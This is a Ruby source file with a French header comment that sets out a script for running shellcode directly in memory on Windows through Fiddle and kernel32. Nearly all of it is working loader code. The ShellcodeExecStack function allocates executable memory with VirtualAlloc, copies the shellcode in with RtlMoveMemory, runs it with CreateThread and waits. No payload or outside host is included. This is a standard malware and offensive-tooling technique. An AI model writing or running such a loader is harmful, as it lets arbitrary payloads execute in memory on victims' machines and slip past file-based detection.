=begin

    Création d'un script permettant d'executer du shellcode directement
    dans la mémoire via ruby

    [ REQUIREMENT ]
        Fiddle (pour utiliser les fonctions de la winAPI)
        KERNEL32.dll
        VirtualAlloc (alloue de la memoire pour placer le shellcode)
        RtlMoveMemory (deplace le shellcode du buffer dans lallocation)

    [ VIRTUALALLOC ]

        LPVOID VirtualAlloc(
            LPVOID lpAddress,
            SIZE_T dwSize,
            DWORD  flAllocationType,
            DWORD  flProtect
        );
    
    [ RtlMoveMemory ]

        VOID RtlMoveMemory(
            _Out_       VOID UNALIGNED *Destination,
            _In_  const VOID UNALIGNED *Source,
            _In_        SIZE_T         Length
        );

    [ CreateThread ]
        HANDLE WINAPI CreateThread(
            __in_opt   LPSECURITY_ATTRIBUTES lpThreadAttributes,
            __in       SIZE_T dwStackSize,
            __in       LPTHREAD_START_ROUTINE lpStartAddress,
            __in_opt   LPVOID lpParameter,
            __in       DWORD dwCreationFlags,
            __out_opt  LPDWORD lpThreadId
        );

    [ WaitForSingleObject ]
        DWORD WaitForSingleObject(
            HANDLE hHandle,
            DWORD  dwMilliseconds
        );


=end

require 'fiddle'
require 'fiddle/import'
require 'fiddle/types'


def ShellcodeExecStack(shellcode)

    include Fiddle

    kernel32dll = Fiddle.dlopen('kernel32')

    ptr_virtualalloc = Function.new(kernel32dll['VirtualAlloc'], [TYPE_INT, TYPE_INT, TYPE_INT, TYPE_INT], 4).call(0, shellcode.size, 0x3000, 0x40)

    buffer = Fiddle::Pointer[shellcode]

    Function.new(kernel32dll['RtlMoveMemory'], [TYPE_INT, TYPE_INT, TYPE_INT], 4).call(ptr_virtualalloc, buffer, shellcode.size)

    threadMemory = Function.new(kernel32dll['CreateThread'], [TYPE_INT, TYPE_INT, TYPE_INT, TYPE_INT, TYPE_INT, TYPE_INT], 4).call(0,0,ptr_virtualalloc,0,0,0)

    Function.new(kernel32dll['WaitForSingleObject'], [TYPE_INT, TYPE_INT], 4).call(threadMemory, -1)
end
